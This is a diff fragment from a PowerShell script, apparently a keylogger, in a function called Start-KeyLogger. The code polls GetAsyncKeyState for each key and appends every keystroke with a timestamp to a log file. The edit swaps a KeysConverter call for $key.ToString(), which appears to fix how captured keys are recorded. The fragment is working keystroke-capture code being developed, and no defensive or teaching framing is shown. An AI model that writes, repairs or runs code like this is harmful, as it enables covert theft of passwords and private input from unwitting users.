@@ -22,7 +22,7 @@ function Start-KeyLogger {
       $state = [API.Win32]::GetAsyncKeyState($char)
       if ($state -eq -32767) {
         $key = [System.Windows.Forms.Keys]$char
-        $keyChar = [System.Windows.Forms.KeysConverter]::ConvertToString($key)
+        $keyChar = $key.ToString()
         if ($keyChar) {
           $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $keyChar"
           Add-Content -Path $logFile -Value $logEntry
